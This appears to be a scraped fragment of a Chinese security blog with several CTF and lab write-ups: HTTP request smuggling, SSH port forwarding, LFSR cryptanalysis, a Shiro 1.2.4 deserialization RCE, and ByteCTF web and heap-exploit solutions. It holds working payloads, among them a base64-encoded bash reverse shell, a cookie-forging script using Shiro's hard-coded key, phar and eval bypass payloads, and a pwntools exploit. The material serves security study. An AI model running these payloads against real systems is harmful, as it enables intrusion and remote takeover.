//请求的资源不存在500 Internal Server Error //服务器发生不可预知的错误503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后才能恢复正常 HTTP请求走私原因很多网站为了提高用户的体验，会使用CDN加速服务，最简单的办法，就是直接在源站前面加一个具有缓存功能的反向代理服务器，用户请求数据的时候，就会在代理服务器中获取，不需要在源站服务器获取代理服务器和源站服务器之间，会重用tcp连接，代理服务器和源站服务器的ip地址是相对固定的，不同用户的请求会通过代理服务器和源站服务器建立连接，但是如果两个服务器的实现方式不一样，假设用户提交了一个模糊的请求，代理服务器认为这是一个正确的HTTP请求，然后转发给源站服务器，可是源站服务器认为它部分正确，只处理了他认为正确的部分，那么剩下的部分就是走私的请求了HTTP请求走私产生的原因是因为HTTP规范提供了两种不同的方式去指定请求结束的位置，分别是Content-Length和Transfer-Encoding两个标头，Content-Length是用来以字节为单位去指定消息内容体的长度，而Transfer-Encoding则是用来指定消息体使用的分块编码（Chunked Encode），表明一个消息报文由一个或者多个数据块组成，每个数据块的大小以字节为单位（十六进制）去衡量，然后跟换行符，再接着是块内容，整个消息体以大小为0的块结束，也就是如果解析的时候遇到0数据块就结束简单理解，就是我在发送请求的时候包含了Content-Length，代理服务器解析后如果没有问题就发送给源码服务器，但是如果我在请求后面包含了Transfer-Encoding，源码服务器解析的时候就会执行我们加在下面的命令，从而绕开前端的waf 常见的请求走私CL不为0的GET请求这个漏洞影响的不仅仅只是GET请求，只是GET请求比较经典，所以举这个例子假设代理服务器允许GET请求携带请求体，而源码服务器不允许，那么它就会忽略掉GET请求中的Content-Length标头，不进行处理，进而产生请求走私假设我们构造如下请求123456GET / HTTP/1.1Host: example.comContent-Length: 40GET /secret HTTP/1.1Host: example.com 代理服务器收到请求后，读取Content-Length判断出这是一个完整的请求，然后转发给源码服务器，但是源码服务器拿到消息以后，因为他不对Content-Length进行处理，而且又因为有Pipeline这个属性的存在，他会认为是收到了两个请求1234567//第一个GET / HTTP 1.1Host: example.comContent-Length: 40//第二个GET /secret HTTP/1.1Host: example.com 这样子，就导致了第二个请求是走私请求 CL-CL假设代理服务器和源码服务器在收到类似请求的时候，都不会返回400错误，但是中间的代理服务器按照第一个Content-Length的值对请求进行处理，然后源站服务器会按照第二个Content-Length的值进行处理，引发请求走私 CL-TE当收到两个请求头的请求包时，代理服务器只处理Content-Length部分，而源站服务器则忽略Content-Length部分，处理Transfer-Encoding这部分请求头 TE-CL当收到两个请求头的请求包时，代理服务器只处理Transfer-Encoding部分，而源站服务器则处理Content-Length这部分请求头 例题例题一CL-TE绕过传送门：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te题目要求我们访问/admin，获得admin的权限然后删了carlos用户然后我们先直接访问/admin，会返回不准访问估计是被前面的代理服务器给限制了，（然后题目又提示了CL-TE，所以直接开干嘻嘻因为源站服务器无论接收到什么，都会信任，所以我们先用Content-Length: 38绕过代理服务器，然后再加一个Transfer-Encoding: chunked，下面加个0，让源站服务器去解析到那里以为请求结束了，把下一个当做一个新的请求然后按照他的要求，本地登录过去最后就是删除用户这个如果没有得到结果需要发多几个包，丢去intruder就行了 例题二TE-CL绕过传送门：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl请求包如下123456789101112131415161718POST / HTTP/1.1Host: ac2c1fa01f5595f08073995a00410065.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: session=R9Jti6N3TXeIs2vsVl46gxSQ3AYi9E68Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 74Transfer-Encoding: chunkedaaaGET /admin//delete?username=carlos HTTP//1.1Host: localhost0 代理服务器接收到Transfer Encoding: chunked，会认为读到0的时候读取完毕，然后转给源站服务器的时候，源站服务器看的是Content-Length，这个时候就会认为aaa的时候请求已经结束了，后面的就认为是另一个请求，因此就可以执行这个请求，成功走私 嘶吼easy_calc这道题当时菜鸡做的时候有点懵逼，代码过滤不严，但是动不动就403，懵逼后来才知道这是请求走私代理服务器会先按照第一个Content-Length的值进行处理，而源站服务器则会按照第二个Content-Length的值去进行处理，所以数据包构造如下","comments":true,"permalink":"https://xi4or0uji.github.io/2019/10/30/HTTP请求走私/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xi4or0uji.github.io/tags/HTTP/"}]},{"title":"内网端口转发","date":"2019-10-24T16:00:00.000Z","path":"2019/10/25/内网端口转发/","text":"前言内网端口转发是个神奇的东西，记录一下 ssh简介在端口转发之前先简单介绍ssh，ssh其实就是一种网络协议，用在计算机之间的加密登录，就是我们在自己的机子用ssh协议远程登录另一个机子，即使中间被截获了，还是安全的，密码并不会泄露登录命令很简单，就是12#当本地用户与远程用户一样的时候可以缺省user，默认端口22ssh user@host -p 2345 而ssh登录过程是这样的123远程主机接收到登录的请求，发送自己的公钥用户接收公钥，加密登录密码，发过去远程主机私钥解密密码，如果一致就允许登录 可以看到，这个过程还是很安全的，但是还有一种可能，如果有人截获了登录请求，然后冒充远程主机将伪造的公钥发给用户，用户就很难辨别是真还是假了，这就是常说的中间人攻击 口令登录当我们第一次登陆的时候，系统会提示1234$ ssh user@hostThe authenticity of host '[localhost]:12313 ([127.0.0.1]:12313)' can't be established.ECDSA key fingerprint is SHA256:h60/aYmB8xxxxxx/n/ABO5Txxxxxx5DU+oZeeKAntk.Are you sure you want to continue connecting (yes/no)? 在第一次登陆的时候，系统会提示我们只用公钥，没有办法验证主机的真实性，确定信任这个过程并继续吗，输入yes以后系统会提示主机已经得到信任，然后就是输入密码，正确就能直接登录进去了，同时远程主机的公钥也会被保存到$HOME/.ssh/known_hosts文件中（linux系统通常为/etc/ssh/ssh_known_hosts），因此下一次登录的时候因为能找出公钥，所以会跳过警告部分 秘钥登录就是我们自己先把公钥文件存储在远程主机上，然后远程主机发一串随机字符串，本地用私钥加密发给远程主机，主机公钥解密以后如果跟原来一样就允许登录，不需要填写密码一般如果有秘钥文件的话会在自己的$HOME/.ssh/目录下找到一个id_rsa.pub和id_rsa文件，没有的话运行ssh-keygen去生成一个，然后再用ssh-copy-id user@host去把公钥发到远程主机上，注释远程主机/etc/ssh/sshd_config文件以下命令123RSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keys 重启一下ssh就能秘钥登录了 端口转发ssh的连接是有方向的，从ssh client发去ssh serve 环境搭建先给个简单的带内网的dockerfile，部署了两个php7.3-apache环境12345678910111213141516171819version: '2'services: machineA: image: php:7.3-apache ports: - \"0.0.0.0:23333:23333\" - \"0.0.0.0:12313:22\" - \"0.0.0.0:12314:80\" volumes: - ./index.php:/var/www/html/index.php restart: always links: - machineB machineB: image: php:7.3-apache volumes: - ./index.php:/var/www/html/index.php tty: true index.php就是一个简单的一句话木马 正向代理假设有ABC三台主机，A请求C，B做代理，代替A访问C，将结果返回给A这种方法操作十分简便，但是需要我们知道中间的作为跳板的B的ssh密码先给machineA装一个openssh-server，配好账号密码1adduser ariel --gid 1000 --home /home/ariel 添加用户到ssh文件中，运行它远程登录1AllowUsers: ariel 重启一下ssh服务即可 方法一将主机的2333端口和machineA（也就是作为中间代理的B）连接起来1234C:\\Users\\Ariel&gt;ssh -D 2333 ariel@*.*.*.* -p 12313ariel@134.175.34.73's password:...ariel@852dde7c09b9: 这样子我们就成功地连接了A和B，再配置一下火狐的代理，因为ssh只能作为socks的代理，所以我们只配置它代理socks主机然后就能通过B访问到内网的主机C了 方法二本地转发还有别的方法12345C:\\Users\\Ariel&gt;ssh -L 2333:192.168.80.3:80 ariel@*.*.*.* -p 12313ariel@134.175.34.73's password:ariel@852dde7c09b9:~$#也可以缺省网卡ip，这就相当于访问localhost（也就是*.*.*.*）的80端口ssh -L 2333:localhost:80 ariel@*.*.*.* -p 12313 这样转发是将machineA（也就是B）作为跳板，将machineB（即C）的80端口的流量转发到本地的2333端口，相当于访问本地的2333端口时，就是访问machineB的服务这个不需要设置代理，直接访问127.0.0.1:2333可以相当于访问192.168.80.3:80 方法三上面的方法都是先要有ssh口令才能转发的，如果只有webshell，那就需要用到端口转发工具了下载地址12旧版：http://rootkiter.com/EarthWorm/ 新版：http://rootkiter.com/Termite/ 先把文件放进去machineA，确定好系统版本执行相对应的文件然后配置好浏览器的代理，就能访问到machineB的服务了 反向代理这里来个反向代理 方法一1234567ssh -R 2333:192.168.80.3:80 ubuntu@*.*.*.*ubuntu@*.*.*.*'s password:ubuntu@VM-0-10-ubuntu:~$ curl http://127.0.0.1:2333&lt;code&gt;&lt;span style=\"color: #000000\"&gt;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;__FILE__&lt;/span&gt;&lt;span style=\"color: #0&lt;br /&gt;eval(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$_GET&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;[&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;'cmd'&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;]);&lt;/span&gt;&lt;/span&gt; 这里是通过B去连接A，如果我们访问本地的2333端口，相当于访问192.168.80.3的80端口 方法二这个也是有个webshell，不需要ssh口令就能连接过去这里同样给个多级内网的环境12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576version: '2'services: machineA: image: php:7.3-apache ports: - \"0.0.0.0:2345:2345\" - \"0.0.0.0:12311:22\" - \"0.0.0.0:12312:80\" mem_limit: 200m volumes: - ./index.php:/var/www/html/index.php restart: always networks: out_network: ipv4_address: 10.0.20.10 innerA_network: ipv4_address: 10.0.30.10 machineB: image: php:7.3-apache mem_limit: 200m volumes: - ./index.php:/var/www/html/index.php restart: always networks: innerA_network: ipv4_address: 10.0.30.11 innerB_network: ipv4_address: 10.0.40.10 machineC: image: php:7.3-apache mem_limit: 200m volumes: - ./index.php:/var/www/html/index.php restart: always networks: innerB_network: ipv4_address: 10.0.40.11 innerC_network: ipv4_address: 10.0.50.10 machineD: image: php:7.3-apache mem_limit: 200m volumes: - ./index.php:/var/www/html/index.php restart: always networks: innerC_network: ipv4_address: 10.0.50.11 innerD_network: ipv4_address: 10.0.60.10networks: out_network: ipam: driver: default config: - subnet: 10.0.20.0/24 innerA_network: ipam: driver: default config: - subnet: 10.0.30.0/24 innerB_network: ipam: driver: default config: - subnet: 10.0.40.0/24 innerC_network: ipam: driver: default config: - subnet: 10.0.50.0/24 innerD_network: ipam: driver: default config: - subnet: 10.0.60.0/24","comments":true,"permalink":"https://xi4or0uji.github.io/2019/10/25/内网端口转发/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"端口转发","slug":"端口转发","permalink":"https://xi4or0uji.github.io/tags/端口转发/"}]},{"title":"反馈移位寄存器","date":"2019-10-17T16:00:00.000Z","path":"2019/10/18/反馈移位寄存器/","text":"前言这篇博客其实在xman培训的时候就应该出的，但当时还有一些没学通，所以拖到现在 简介这个其实是硬件实现的一个过程，但是被人搬去了密码学上使用，于是就有了这个知识点啦这其实是一种流密码，整个过程可以简单的理解成一串数据放去进行一系列随机化操作以后获得加密后的数据，这中间的操作，也就是反馈函数如果是线性的，那就是线性反馈移位寄存器，如果是非线性的，那就是非线性反馈移位寄存器，emmm，这么说很难理解，放几个例题就能懂了 线性反馈移位寄存器LFSR2018 ciscn oldstream1234567891011121314151617181920212223242526flag = \"flag&#123;xxxxxxxxxxxxxxxx&#125;\"assert flag.startswith(\"flag&#123;\")assert flag.endswith(\"&#125;\")assert len(flag)==14def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffffff #R左移一位然后保留低32位，记录该值到output i=(R&amp;mask)&amp;0xffffffff #将R和mask进行与运算，保留低32位并赋值给i lastbit=0 while i!=0: lastbit^=(i&amp;1) #将lastbin和i的每一位异或，然后赋值给lastbin i=i&gt;&gt;1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],16)mask = 0b10100100000010000000100010010100f=open(\"key\",\"w\")for i in range(100): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp))f.close() 这是国赛的一道题，也是一道比较简单的LSRF的题目，先读代码，简单的可以理解成：将mask的二进制为1的地方跟flag对应起来，然后记录到I上，然后将1的个数记录到output上，一直循环进行运算，再简单一点的理解就是循环将高位的值异或到低位上，信息并没有丢失，所以我们要解密逆推回去就行了12345678910111213141516171819202122232425262728293031323334import libnumfrom Crypto.Util.number import bytes_to_long# coding=utf-8def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffffff i=(R&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)def lfsr_inv(R, mask): str = bin(R)[2:].zfill(32) new = str[-1:] + str[:-1] #最后一个 + 前面31个 new = int(new, 2) i = (new &amp; mask) &amp; 0xffffffff lastbin = 0 while i!=0: lastbin ^= (i &amp; 1) i = i &gt;&gt; 1 return R&gt;&gt;1 | lastbin&lt;&lt;31# flag = 14-5-1 = 8mask = 0b10100100000010000000100010010100data = open(\"key\").read()data = data[:4]c = bytes_to_long(data)for k in range(32): c = lfsr_inv(c, mask)print hex(c)#flag: 0x926201d7L 这题还有另一种使用矩阵变幻的做法123456789101112131415161718192021222324252627mask = 0b10100100000010000000100010010100N = 32F = GF(2)b = ''with open('key', 'rb') as f: b = f.read()R = [vector(F, N) for i in range(N)]for i in range(N): R[i][N - 1] = mask &gt;&gt; (31 - i) &amp; 1for i in range(N - 1): R[i + 1][i] = 1M = Matrix(F, R)M = M ^ Nvec = vector(F, N)row = 0for i in range(N / 8): t = ord(b[i]) for j in xrange(7, -1, -1): vec[row] = t &gt;&gt; j &amp; 1 row += 1print rank(M)num = int(''.join(map(str, list(M.solve_left(vec)))), 2)print hex(num) 2019 de1ctf babylfsr前面的做法只能适用于flag长度比较小的时候，当flag长度比较长的时候，直接爆破显然是不现实的，算力支撑不了，因此只能进行矩阵变换进行求解 非线性反馈移位寄存器NFSR非线性的反馈移位寄存器一般有三种123非线性组合生成器，对多个LFSR的输出内容使用一个非线性的组合函数非线性滤波生成器，对一个LSRF的输出内容使用一个非线性的组合函数钟控生成器，使用一个或多个LFSR的输出来控制另一个或多个LFSR的时钟 2018 ciscn streamgame3源码在这里123456789101112131415161718192021222324252627282930313233343536373839404142434445464748flag='flag&#123;01b9cb05979c16b2f3&#125;'assert flag.startswith(\"flag&#123;\")assert flag.endswith(\"&#125;\")assert len(flag)==24def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit)def single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask): (R1_NEW,x1)=lfsr(R1,R1_mask) (R2_NEW,x2)=lfsr(R2,R2_mask) (R3_NEW,x3)=lfsr(R3,R3_mask) return (R1_NEW,R2_NEW,R3_NEW,(x1*x2)^((x2^1)*x3))R1=int(flag[5:11],16)R2=int(flag[11:17],16)R3=int(flag[17:23],16)assert len(bin(R1)[2:])==17assert len(bin(R2)[2:])==19assert len(bin(R3)[2:])==21R1_mask=0x10020R2_mask=0x4100cR3_mask=0x100002for fi in range(1024): print (fi) tmp1mb=\"\" for i in range(1024): tmp1kb=\"\" for j in range(1024): tmp=0 for k in range(8): (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask) tmp = (tmp &lt;&lt; 1) ^ out tmp1kb+=chr(tmp) tmp1mb+=tmp1kb f = open(\"./output/\" + str(fi), \"ab\") f.write((bytes)(tmp1mb.encode())) f.close() 2019 TCTF zer0lfsr这题跟上一题差不多，也是先求三个lfsr，然后再联合获得结果，源码如下1234567891011121314151617181920212223242526272829303132333435from secret import init1,init2,init3,FLAGimport hashlibassert(FLAG==\"flag&#123;\"+hashlib.sha256(init1+init2+init3).hexdigest()+\"&#125;\")class lfsr(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 def next(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return outputdef combine(x1,x2,x3): return (x1*x2)^(x2*x3)^(x1*x3)if __name__==\"__main__\": l1 = lfsr(int.from_bytes(init1,\"big\"),0b100000000000000000000000010000000000000000000000,48) l2 = lfsr(int.from_bytes(init2,\"big\"),0b100000000000000000000000000000000010000000000000,48) l3 = lfsr(int.from_bytes(init3,\"big\"),0b100000100000000000000000000000000000000000000000,48) with open(\"keystream\",\"wb\") as f: for i in range(8192): b = 0 for j in range(8): b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next()) f.write(chr(b).encode()) 这题没有把l1、l2、l3的长度给出来，也没有更多的信息，所以不能直接用相关攻击，但是我们可以仔细观察，虽然有掩码位数很长，但是只有两位是1，其他位都是0，所以我们可以先思考一下，next处理的部分，对他进行影响的，只是init中位数为1的部分，而且处理后的信息储存到了最低位，没有丢失，因此可以逆推回去获得原值，而其中combine的三个值因为输入为单位，所以实际上可以变换为12def combine(x1, x2, x3): return (x1&amp;x2) ^ (x2&amp;x3) ^ (x3&amp;x1) 因此结合一起的三个lfsr就可以轻易的分解为单个lfsr了，剩下的求解可以直接用z3去跑123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# -*- coding:utf8 -*-from z3 import *from Crypto.Util.number import long_to_bytesimport hashlibdef combine(x1, x2, x3): return (x1 * x2) ^ (x2 * x3) ^ (x1 * x3)def solve_3_lfsr(keystream, relevant_bit_indices, length, mask_length): len_mask = (2 ** (mask_length + 1) - 1) result_bits = map(long, \"\".join([bin(ord(c))[2:].zfill(8) for c in keystream])) s = Solver() x = BitVec('x', length) # z3中只有BitVec类型支持异或操作 y = BitVec('y', length) # BitVec表示无符号数 z = BitVec('z', length) inits = [x, y, z] for result in result_bits: combs = [] new_inits = [] for index in range(3): # 无符号数的移位需要使用LShR，表示逻辑移位 relevant_bit1 = (inits[index] &amp; (1 &lt;&lt; relevant_bit_indices[index][0])) bit1_value = LShR(relevant_bit1, relevant_bit_indices[index][0]) relevant_bit2 = inits[index] &amp; (1 &lt;&lt; relevant_bit_indices[index][1]) bit2_value = LShR(relevant_bit2, relevant_bit_indices[index][1]) single_lfsr_result = bit1_value ^ bit2_value combs.append(single_lfsr_result) new_init = ((inits[index] &lt;&lt; 1) &amp; len_mask) ^ single_lfsr_result new_inits.append(new_init) s.add(combine(combs[0], combs[1], combs[2]) == result) # 约束条件 inits = new_inits s.check() model = s.model() x_res = int(str(model[x])) y_res = int(str(model[y])) z_res = int(str(model[z])) return x_res, y_res, z_reswith codecs.open(\"keystream\", 'rb', 'utf8') as input_file: data = input_file.read() mask1 = (47, 22) mask2 = (47, 13) mask3 = (47, 41) keystream = data[:24] x, y, z = solve_3_lfsr(data[:24], [mask1, mask2, mask3], 48, 48) init1, init2, init3 = map(long_to_bytes, [x, y, z]) print \"flag&#123;\" + hashlib.sha256(init1 + init2 + init3).hexdigest() + \"&#125;\" #flag&#123;b527e2621131134ec22250cfbca75e8c9f5ae4f40370871fd55910927f66a1b4&#125; 后记看来还得继续拖着了……生成函数啥的没学懂，做题到后面地动山摇Orz","comments":true,"permalink":"https://xi4or0uji.github.io/2019/10/18/反馈移位寄存器/","categories":[{"name":"CRYPTO","slug":"CRYPTO","permalink":"https://xi4or0uji.github.io/categories/CRYPTO/"}],"tags":[{"name":"LFSR","slug":"LFSR","permalink":"https://xi4or0uji.github.io/tags/LFSR/"}]},{"title":"Shiro RememberMe 1.2.4远程代码执行漏洞复现","date":"2019-10-15T16:00:00.000Z","path":"2019/10/16/Shiro-RememberMe-1.2.4远程代码执行漏洞复现/","text":"前言最近博客更新的没有那么勤快了，比赛和杂七杂八的事情太多了，还是要静下心来好好学习啊菜鸡其他语言的漏洞学的并不好，这次拿到了ogeek线下的一个题，来好好分析一波，也学一波javaOrz 环境配置师傅们已经在dockerhub上搭好了环境了，pull下来就能用了1https://github.com/Medicean/VulApps/tree/master/s/shiro/1 漏洞分析生成cookieshiro在登录的时候会提供给一个remember me的功能，用cookie去记录登录的用户，来保证下次登录不用写密码就能直接登录。具体过程是这样的，shiro对信息进行加密的AES秘钥是硬编码在文件中的，因此秘钥我们是可以知道的，而iv则为base64解码cookie后的前16个字节，因此我们可以控制信息进而构造出任意的序列化代码处理rememberme的cookie类在org.apache.shiro.web.mgt.CookieRememberMeManager，它的父类为org.apache.shiro.web.mgt.AbstractRememberMeManager，定义的默认的秘钥就是在这里面了在成功登录且选择了rememberme的选项的时候，就会进入onSuccessfulLogin里接着就是一直跟过去123onSuccessfulLogin::rememberIdentityrememberIdentity::rememberIdentityrememberIdentity::convertPrincipalsToBytes 可以看到，在登录的时候，后台会对信息进行序列化然后再加密，加密的过程如下在加密的时候，序列化用的类是PrincipalCollection，encrypt的方法是AES，模式为CBC，填充模式为PKCS5继续跟过去AesCipherService的父类DefaultBlockCipherService可以看到加密函数更加具体的定义而前面encrypt函数里面的ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());调用的encrypt是在org.apache.shiro.crypto.JcaCipherService这个类里面的，查看这个类的encrypt函数这个函数将iv放在crypt函数加密的数据前返回，加密后在org.apache.shiro.web.mgt.CookieRememberMeManager这个类内的rememberSerializedIdentity方法进行base64编码，然后返回来 解析cookie在org.apache.shiro.web.mgt.CookieRememberMeManager里会将传过来的base64字符串进行解码后赋值给byte，所以序列化后的字符就是存在这里的1byte[] decoded = Base64.decode(base64); 然后再调用org.apache.shiro.web.mgt.AbstractRememberMeManager里的getRememberedPrincipals方法去获取cookie中的身份信息跟过去convertBytesToPrincipals可以看到后台会对信息进行解码，然后再进行反序列化而decrypt方法中的秘钥就是前面加密过程的秘钥，通过getDecryptionCipherKey()获得它看回去构造函数对于加解密的定义，可以看到，加解密所用的秘钥都是硬编码的秘钥所以Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)这个秘钥会用于org.apache.shiro.crypto.JcaCipherService这个类里的decrypt方法中进行解码，然后再从cookie中取出iv和加密后的序列化数据在decrypt方法中调用crypt方法结合密文、key、iv解密在前面的图我们可以看见，解密成功后，返回的数据就会进入到deserialize函数去进行反序列化，序列化的类是DefaultSerializer，this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();，先跟过去看一下可以看到有readobject，至此，我们就能成功触发反序列化了 复现过程先用nc一下1nc -vlp 2345 然后起一个JRMP端口1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvcG9ydCAwPiYxIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;' 然后再执行以下文件生成rememberme的cookie1234567891011121314151617181920import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s : s + ((BS - len(s) % BS) * chr(BS - len(s) %BS)).encode() key = base64.b64encode(\"kPH+bIxk5D2deZiIxcaaaA==\") iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == \"__main__\": payload = encode_rememberme(\"vps_ip:port\") print \"rememberMe=&#123;0&#125;\".format(payload.decode()) 将运行出来的值用burp发送过去，就可以出发反序列化漏洞，监听2345端口，因此成功反弹shell","comments":true,"permalink":"https://xi4or0uji.github.io/2019/10/16/Shiro-RememberMe-1.2.4远程代码执行漏洞复现/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xi4or0uji.github.io/tags/java/"}]},{"title":"2019 bytectf wp","date":"2019-09-10T16:00:00.000Z","path":"2019/09/11/2019-bytectf-wp/","text":"前几天打了字节跳动的CTF，我还是太菜了，挂一挂队内wp WEBboring_code题目给了源码，但是很是做了很久才出来，wtcl12345678910111213141516171819202122232425262728293031323334&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match('/data:\\/\\//i', $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST['url']))&#123; $url = $_POST['url']; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match('/baidu\\.com$/', $r['host'])) &#123; $code = file_get_contents($url); var_dump($code); if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) &#123; if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) &#123; echo 'bye~'; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo \"error: host not allowed\"; &#125; &#125; else &#123; echo \"error: invalid url\"; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 一开始的baidu域名绕过绕了快一天，最后买了个域名就出了（这个题出钱就出flag.jpg接下来的就是绕过payload了，这个考点跟之前ph牛的无参函数绕过很相似，但是过滤更加严格1if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); rss这题人傻了，上一题的域名只活了两个小时就被腾讯云封了，然后就卡卡卡……心态爆炸压根没想起data协议，复现复现，wtcl这题同样也需要百度域名，但是没有限制data协议，所以可以直接用data协议进行绕过，payload如下1data://baidu.com/plain;base64|xxxxxxxx(base64编码的xxe payload) 然后利用php://filter协议去读php源码 ezCMS首先是扫后台扫到源码，然后就是进行源码审计，可以看到前半部分是个简单的哈希长度扩展攻击，想要文件上传先要绕过这关，脚本就不贴了，网上随便都能搜到接下来的就是phar和zip的利用去删除网站文件绕过上传shell，exp如下123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpclass File&#123; public $checker; function __construct() &#123; $this-&gt;checker = new Admin(); &#125;&#125;class Admin&#123; public $size; public $checker; public $content_check; function __construct() &#123; $this-&gt;checker = 1; $this-&gt;size = 1024; $this-&gt;content_check = new Profile(); &#125;&#125;class Check&#123; public $filename; function __construct($filename) &#123; $this-&gt;filename = $filename; &#125;&#125;class Profile&#123; public $username; public $password; public $admin; function __construct() &#123; $this-&gt;admin = new ZipArchive(); $this-&gt;username = \"/var/www/html/sandbox/21817c35416d7783669a7c7d8ed6c73a/.htaccess\"; $this-&gt;password = ZipArchive::OVERWRITE; &#125;&#125;$phar = new Phar('exp.phar');$phar -&gt; stopBuffering();$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; addFromString('test.txt','test');$object = new File();$object -&gt; s = 'aaa;';$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering(); 触发反序列化漏洞就用php://filter去绕过 PWNmulnote这道题就是一道double free（友好的出题人）首先先在ida里面分析出函数，可以知道malloc&lt;0x10000，也就是可以unsorted_bin和fast_bin的攻击，后面也一样，把函数分析出来，会发现free函数有UAF（动态调试比静态分析好多了，直接动态边调试边看），想到fastbin的attcak，首先unsorted_bin申请再释放泄露出真实地址，然后double free改malloc_hook为onegadget，最后getshell123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./mulnote')if local: p = process('./mulnote') libc = elf.libcelse: p = remote('112.126.101.96', 9999) libc = ELF('./libc.so')sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive()def debug(addr,PIE=True): if PIE: text_base = int(os.popen(\"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'\".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,\"b *&#123;&#125;\".format(hex(addr)))def bk(addr): gdb.attach(p,\"b *\"+str(hex(addr)))def malloc(size,content): ru(\"&gt;\") sl('C') ru(\"size&gt;\") sl(str(size)) ru(\"note&gt;\") sd(content)def puts(): ru(\"&gt;\") sl('S')def edit(index1,content): ru(\"&gt;\") sl('E') ru(\"index&gt;\") sl(str(index1)) ru(\"new note&gt;\") sd(content)def free(index1): ru(\"&gt;\") sl('R') ru(\"index&gt;\") sl(str(index1))def exit(): ru(\"&gt;\") sl('Q')malloc(0xC8,'AAAAAAA')free(0)puts()ru(\"[*]note[0]:\\n\")malloc_hook = u64(rc(6).ljust(8,'\\x00')) - 88 - 0x10print \"malloc_hook--&gt;\" + hex(malloc_hook)libc_base = malloc_hook - libc.symbols[\"__malloc_hook\"]system = libc_base + libc.symbols[\"system\"]free_hook = libc_base + libc.symbols[\"__free_hook\"]onegadget = libc_base + 0x4526afake_chunk = malloc_hook - 0x23 malloc(0x68,'A'*0x68)malloc(0x68,'B'*0x68)malloc(0x68,'V'*0x68)free(1)free(3)free(1)malloc(0x68,p64(fake_chunk))malloc(0x68,p64(fake_chunk))malloc(0x68,p64(fake_chunk))py 